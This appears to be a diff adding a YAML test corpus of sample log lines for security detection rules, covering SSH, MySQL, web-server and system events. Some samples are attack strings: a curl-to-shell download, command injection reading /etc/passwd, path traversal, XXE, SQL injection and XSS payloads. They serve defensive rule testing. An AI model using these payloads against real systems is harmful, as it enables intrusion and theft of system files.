@@ -1,0 +1,405 @@
+# Rule sample corpus. Every enabled rule with a match expression must appear
+# here with at least one positive and one negative sample; boundary samples
+# pin near-miss behaviour so a broadened regex is caught in CI.
+#
+# Samples are evaluation fixtures, not production data.
+samples:
+  - rule_id: 81001
+    positive:
+      - message: "Failed password for root from 10.0.0.5 port 52222 ssh2"
+    negative:
+      - message: "Accepted publickey for deploy from 10.0.0.5 port 52222 ssh2"
+    boundary:
+      - text: "authentication failure; logname= uid=0"
+        want: true
+        note: "alternation member"
+      - text: "brute force protection is enabled"
+        want: true
+        note: "alternation member"
+      - text: "user authentication ok"
+        want: false
+        note: "near miss must not fire"
+
+  - rule_id: 81003
+    positive:
+      - message: "GET /wp-admin/setup.php HTTP/1.1"
+    negative:
+      - message: "GET /index.html HTTP/1.1"
+    boundary:
+      - text: "GET /Admin/ HTTP/1.1"
+        want: false
+        note: "matching is case sensitive"
+      - text: "GET /administrator/ HTTP/1.1"
+        want: true
+        note: "/admin is a prefix match, documented behaviour"
+
+  - rule_id: 81002
+    positive:
+      - message: "POST /upload multipart/form-data; filename=shell.php HTTP/1.1"
+    negative:
+      - message: "POST /upload multipart/form-data; filename=report.pdf HTTP/1.1"
+    boundary:
+      - text: "filename=payload.jsp content-type=multipart/form-data"
+        want: false
+        note: "upload marker must precede the extension"
+      - text: "GET /upload/help.html HTTP/1.1"
+        want: false
+        note: "no upload marker"
+
+  - rule_id: 81004
+    positive:
+      - message: "process_start cmd=curl http://10.0.0.9/x.sh | sh"
+    negative:
+      - message: "process_start cmd=/usr/sbin/nginx -g daemon off;"
+    boundary:
+      - text: "suspicious_process base64 -d payload"
+        want: true
+        note: "second alternation branch"
+
+  - rule_id: 81005
+    positive:
+      - message: "sqli detected in login form parameter user"
+    negative:
+      - message: "login form validation failed"
+    boundary:
+      - text: "select * from users where id=1 union select password from users"
+        want: true
+        note: "raw SQL text"
+      - text: "the union representative called"
+        want: false
+        note: "no SQL marker"
+
+  - rule_id: 81006
+    positive:
+      - message: "runtime.exec /bin/sh -c id"
+    negative:
+      - message: "java.lang.Runtime initialized"
+    boundary:
+      - text: "processbuilder started"
+        want: true
+        note: "class name signal"
+
+  - rule_id: 81007
+    positive:
+      - message: "java.io.ObjectInputStream readObject deserialization payload"
+    negative:
+      - message: "GET /health HTTP/1.1"
+    boundary:
+      - text: "GET /etc/passwd HTTP/1.1"
+        want: true
+        note: "sensitive path"
+      - text: "GET /etc/passwd.bak HTTP/1.1"
+        want: true
+        note: "prefix match is intentional"
+
+  - rule_id: 81008
+    positive:
+      - message: "chain_id=abc123 stage=execution host=web-01"
+    negative:
+      - message: "chain_id=abc123 stage=recon host=web-01"
+    boundary:
+      - text: "attack_chain=xyz impact=high"
+        want: true
+        note: "attack_chain alias"
+      - text: "chain_id=xyz stage=persistence"
+        want: false
+        note: "stage outside the listed set"
+
+  - rule_id: 100110
+    positive:
+      - message: "Access denied for user 'root'@'10.0.0.9' (using password: YES)"
+    negative:
+      - message: "Access granted for user 'root'@'10.0.0.9'"
+
+  - rule_id: 100112
+    positive:
+      - message: "Got error 28 from storage engine"
+    negative:
+      - message: "Query OK, 1 row affected"
+
+  - rule_id: 100113
+    positive:
+      - message: "Slow query: SELECT * FROM orders WHERE id=1"
+    negative:
+      - message: "Query completed in 3ms"
+
+  - rule_id: 100114
+    positive:
+      - message: "Too many connections"
+    negative:
+      - message: "Connection established"
+
+  - rule_id: 100115
+    positive:
+      - message: "Deadlock found when trying to get lock"
+    negative:
+      - message: "Lock wait timeout exceeded"
+
+  - rule_id: 100116
+    positive:
+      - message: "Error in Log_event::read_log_event()"
+    negative:
+      - message: "Log_event written to binlog"
+
+  - rule_id: 100117
+    positive:
+      - message: "can't open file './db/t.frm'"
+    negative:
+      - message: "Table opened successfully"
+    boundary:
+      - text: "Table 'db.t' is marked as corrupt"
+        want: true
+        note: "regex alternation"
+
+  - rule_id: 100118
+    positive:
+      - message: "SELECT command denied to user 'app'@'10.0.0.2'"
+    negative:
+      - message: "SELECT command accepted"
+
+  - rule_id: 100119
+    positive:
+      - message: "Slave I/O thread: error connecting to master"
+    negative:
+      - message: "replication lag 0 seconds"
+
+  - rule_id: 31101
+    positive:
+      - message: "GET /?id=1 UNION SELECT password FROM users HTTP/1.1"
+    negative:
+      - message: "GET /?page=unique-items HTTP/1.1"
+    boundary:
+      - text: "GET /?q=' OR '1'='1 HTTP/1.1"
+        want: true
+        note: "boolean injection"
+      - text: "GET /?q=unionize HTTP/1.1"
+        want: true
+        note: "substring match is intentional"
+
+  - rule_id: 31102
+    positive:
+      - message: "GET /?q=<script>alert(1)</script> HTTP/1.1"
+    negative:
+      - message: "GET /?q=hello HTTP/1.1"
+
+  - rule_id: 31103
+    positive:
+      - message: "GET /?cmd=;cat /etc/passwd HTTP/1.1"
+    negative:
+      - message: "GET /?a=1 HTTP/1.1"
+
+  - rule_id: 31151
+    positive:
+      - message: "sqlmap/1.7.2#stable (https://sqlmap.org) scanning"
+    negative:
+      - message: "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101"
+
+  - rule_id: 31152
+    positive:
+      - message: "GET /../../etc/passwd HTTP/1.1"
+    negative:
+      - message: "GET /a/b HTTP/1.1"
+    boundary:
+      - text: "GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1"
+        want: true
+        note: "encoded traversal"
+
+  - rule_id: 31153
+    positive:
+      - message: "GET /missing HTTP/1.1\" 404 162"
+    negative:
+      - message: "GET /ok HTTP/1.1\" 200 512"
+
+  - rule_id: 31154
+    positive:
+      - message: "GET /boom HTTP/1.1\" 500 89"
+    negative:
+      - message: "GET /ok HTTP/1.1\" 200 512"
+
+  - rule_id: 31155
+    positive:
+      - message: "GET /upstream HTTP/1.1\" 502 157"
+    negative:
+      - message: "GET /ok HTTP/1.1\" 200 512"
+
+  - rule_id: 31156
+    positive:
+      - message: "GET /private HTTP/1.1\" 403 153"
+    negative:
+      - message: "GET /ok HTTP/1.1\" 200 512"
+
+  - rule_id: 31157
+    positive:
+      - message: "GET /login HTTP/1.1\" 401 91"
+    negative:
+      - message: "GET /ok HTTP/1.1\" 200 512"
+
+  - rule_id: 31159
+    positive:
+      - message: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+    negative:
+      - message: "<html><body>ok</body></html>"
+
+  - rule_id: 31160
+    positive:
+      - message: "O:{\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}"
+    negative:
+      - message: "a:1:{i:0;s:3:\"abc\";}"
+
+  - rule_id: 31158
+    positive:
+      - message: "GET /uploads/shell.php HTTP/1.1"
+    negative:
+      - message: "GET /uploads/report.pdf HTTP/1.1"
+    boundary:
+      - text: "GET /uploads/backup.cgi HTTP/1.1"
+        want: true
+        note: "cgi script"
+      - text: "GET /uploads/photo.png HTTP/1.1"
+        want: false
+        note: "image is not executable"
+
+  - rule_id: 5710
+    positive:
+      - message: "Invalid user admin from 10.0.0.9 port 40022"
+    negative:
+      - message: "Accepted password for deploy from 10.0.0.9 port 40022"
+
+  - rule_id: 5711
+    positive:
+      - message: "Accepted publickey for deploy from 10.0.0.9 port 40022 ssh2"
+    negative:
+      - message: "Failed password for root from 10.0.0.9 port 40022 ssh2"
+
+  - rule_id: 5713
+    positive:
+      - message: "Failed password for root from 10.0.0.9 port 40022 ssh2"
+    negative:
+      - message: "Accepted password for deploy from 10.0.0.9 port 40022 ssh2"
+
+  - rule_id: 5714
+    positive:
+      - message: "Local: crc32 compensation attack detected"
+    negative:
+      - message: "crc32 verification ok"
+
+  - rule_id: 5715
+    positive:
+      - message: "User deploy not allowed because shell is /usr/sbin/nologin"
+    negative:
+      - message: "User deploy allowed to log in"
+
+  - rule_id: 5716
+    positive:
+      - message: "error: PAM: Authentication failure for deploy"
+    negative:
+      - message: "PAM: session opened for deploy"
+
+  - rule_id: 5717
+    positive:
+      - message: "Connection closed by authenticating user deploy"
+    negative:
+      - message: "Connection established by deploy"
+
+  - rule_id: 5718
+    positive:
+      - message: "User root not allowed because account is locked"
+    negative:
+      - message: "User root authenticated"
+
+  - rule_id: 5720
+    positive:
+      - message: "error: PAM: Account locked for root"
+    negative:
+      - message: "PAM: login successful"
+
+  - rule_id: 5721
+    positive:
+      - message: "Timeout before authentication for 10.0.0.9"
+    negative:
+      - message: "Session started for deploy"
+
+  - rule_id: 5722
+    positive:
+      - message: "key_regulate_before mismatch"
+    negative:
+      - message: "key_regulate_after match"
+
+  - rule_id: 60101
+    positive:
+      - message: "authentication failure; logname= uid=0 euid=0"
+    negative:
+      - message: "authentication success; logname= uid=0"
+
+  - rule_id: 60102
+    positive:
+      - message: "session opened for user deploy by (uid=0)"
+    negative:
+      - message: "session closed for user deploy"
+
+  - rule_id: 60103
+    positive:
+      - message: "session closed for user deploy"
+    negative:
+      - message: "session opened for user deploy"
+
+  - rule_id: 60104
+    positive:
+      - message: "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; COMMAND=/bin/systemctl restart nginx"
+    negative:
+      - message: "deploy ran systemctl restart nginx"
+
+  - rule_id: 60105
+    positive:
+      - message: "sudo: authentication failure for deploy"
+    negative:
+      - message: "sudo: session opened for deploy"
+
+  - rule_id: 60106
+    positive:
+      - message: "CRON[2048]: (root) CMD (/usr/bin/backup.sh)"
+    negative:
+      - message: "timer unit backup.timer fired"
+
+  - rule_id: 60107
+    positive:
+      - message: "systemd[1]: Started Daily apt upgrade."
+    negative:
+      - message: "apt upgrade finished"
+
+  - rule_id: 60108
+    positive:
+      - message: "Failed to start The LyFlow Agent."
+    negative:
+      - message: "Started The LyFlow Agent."
+
+  - rule_id: 60109
+    positive:
+      - message: "systemd[1]: Reached target reboot."
+    negative:
+      - message: "systemd[1]: Started session 42 for user deploy."
+    boundary:
+      - text: "systemd[1]: Shutting down for shutdown."
+        want: true
+        note: "alternation member"
+      - text: "reboot scheduled by operator"
+        want: false
+        note: "must keep the systemd prefix"
+
+  - rule_id: 60110
+    positive:
+      - message: "password check failed for user deploy"
+    negative:
+      - message: "password check passed for user deploy"
+
+  - rule_id: 60111
+    positive:
+      - message: "No space left on device"
+    negative:
+      - message: "disk usage 42%"
+
+  - rule_id: 60112
+    positive:
+      - message: "useradd: added deploy to group sudo"
+    negative:
+      - message: "usermod: no changes"
